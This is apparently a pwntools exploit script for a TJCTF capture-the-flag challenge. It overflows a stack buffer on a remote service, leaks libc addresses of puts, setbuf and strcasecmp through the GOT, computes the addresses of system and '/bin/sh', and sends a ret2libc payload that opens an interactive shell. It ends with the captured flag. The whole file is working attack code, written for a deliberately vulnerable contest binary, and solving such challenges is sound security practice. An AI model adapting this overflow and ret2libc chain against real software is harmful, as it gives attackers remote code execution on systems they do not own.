# RazviOverflow
# Python3

from pwn import *

binary = ELF("./binary")

#print(binary.symbols)

got_puts = p32(binary.got[b"puts"])
#got_gets = binary.got[b"gets"]
#got_libc_start_main = binary.got[b"__libc_start_main"]
got_setbuf = p32(binary.got[b"setbuf"])
got_strcasecmp = p32(binary.got[b"strcasecmp"])

plt_puts = p32(binary.plt[b"puts"])
#plt_gets = binary.plt[b"gets"]
#plt_libc_start_main = binary.plt[b"__libc_start_main"]
#plt_setbuf = binary.plt[b"setbuf"]
#plt_strcasecmp = binary.plt[b"strcasecmp"]
get_tree_addr = p32(binary.symbols[b"get_tree"])

#binary = process("binary")
'''
0x08049e74      .dword 0xf7dd3480  ; RELOC 32 setbuf 				
0x08049e78      .dword 0x080483d6  ; RELOC 32 printf				
0x08049e7c      .dword 0xf7dcbb00  ; RELOC 32 gets 					trailing null byte. Won't get printed by puts.
0x08049e80      .dword 0xf7dcc550  ; RELOC 32 puts
0x08049e84      .dword 0xf7d7be00  ; RELOC 32 __libc_start_main		trailing null byte. Won't get printed by puts.
0x08049e88      .dword 0xf7ebcea0  ; RELOC 32 strcasecmp
'''

# Buffer is at ebp - 0x10c 
padding = b"A" * 0x10c
padding += b"B" * 4 # saved_ebp or old_ebp, whatever you want to call it

ret_addr = get_tree_addr

payload_puts = padding + plt_puts + ret_addr + got_puts
payload_setbuf = padding + plt_puts + ret_addr + got_setbuf
payload_strcasecmp = padding + plt_puts + ret_addr + got_strcasecmp


#binary = process("./binary")
binary = remote("p1.tjctf.org", 8006)

print(binary.recvline()) # Enter a tree type 
binary.sendline(payload_puts)
binary.recvline() # I dont have the tree
puts_address = binary.recvline()[:4]
print("Address of dynamically linked puts -> " + str(hex(u32(puts_address))))
print(binary.recvline()) # Enter a tree type
binary.sendline(payload_setbuf)
binary.recvline() # I dont have the tree
setbuf_address = binary.recvline()[:4]
print("Address of dynamically linked setbuf -> " + str(hex(u32(setbuf_address))))
print(binary.recvline()) # Enter a tree type
binary.sendline(payload_strcasecmp)
binary.recvline() # I dont have the tree
strcasecmp_address = binary.recvline()[:4]
print("Address of dynamically linked sstrcasecmp -> " + str(hex(u32(strcasecmp_address))))
print(binary.recvline()) # Enter a tree type


'''
On the first run I got:
Address of dynamically linked puts -> 0xf7e5e360
Address of dynamically linked setbuf -> 0xf7e64f10
Address of dynamically linked sstrcasecmp -> 0xf7f4c5b0

According to libc.nullbyte.cat, it corresponds to libc6-i386_2.27-3ubuntu1_amd64 
I will be getting system and bin_sh_str offsets relative to puts address
'''

system_address = p32(u32(puts_address) - 0x2a650)
str_bin_sh = p32(u32(puts_address) +  	0x11456f)

shell_payload = padding + system_address + b"AAAA" + str_bin_sh

binary.sendline(shell_payload)
binary.interactive()

# Flag is: tjctf{tr33_c0de_in_my_she115}


